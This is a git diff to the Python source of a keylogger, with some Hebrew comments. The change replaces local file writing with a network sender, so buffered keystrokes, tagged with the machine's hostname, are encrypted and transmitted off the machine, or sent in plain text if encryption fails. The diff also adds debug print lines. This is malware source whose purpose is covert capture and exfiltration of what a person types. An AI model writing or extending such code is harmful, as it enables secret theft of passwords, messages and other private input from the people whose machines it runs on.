@@ -6,6 +6,7 @@ from datetime import datetime
 import threading
 from create_encryption_key import CreateKey
 import socket
+from network_writer import NetworkSaver
 
 class KeyloggerManager:
 
@@ -13,7 +14,7 @@ class KeyloggerManager:
         self.keylogger_listener = ListenerKeyboard()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
-        self.to_send = FileWriter()
+        self.to_send = NetworkSaver()
         self.machine_name = socket.gethostname()
         self.copied = False
         self.running = False
@@ -67,10 +68,14 @@ class KeyloggerManager:
                     encrypting_text = Encryption(text,self.key)
                     encrypted_text = encrypting_text.encrypt_text()
                     self.to_send.send_data(encrypted_text,self.machine_name)
+                    print("send succesfully")
+
                 except:
                     self.to_send.send_data(text, self.machine_name)
+                    print("send succesfully")
 
-        if self.buffer:         #ב  שליחת הנתונים האחרונים שהתקבלו אם ישנם בעת עצירת כל פעילות המאזין והמנהל
+
+        if self.buffer:
             text = ""
             for k, v in self.buffer.items():
                 text += f"{k}:\n"
@@ -80,9 +85,11 @@ class KeyloggerManager:
             try:
                 encrypting_text = Encryption(text, self.key)
                 encrypted_text = encrypting_text.encrypt_text()
-                self.to_send.send_data(encrypted_text, {self.machine_name})
+                self.to_send.send_data(encrypted_text, f"{self.machine_name}")
+                print("send succesfully")
             except:
-                self.to_send.send_data(text, {self.machine_name})
+                self.to_send.send_data(text, f"{self.machine_name}")
+                print("send succesfully")
 
 
 
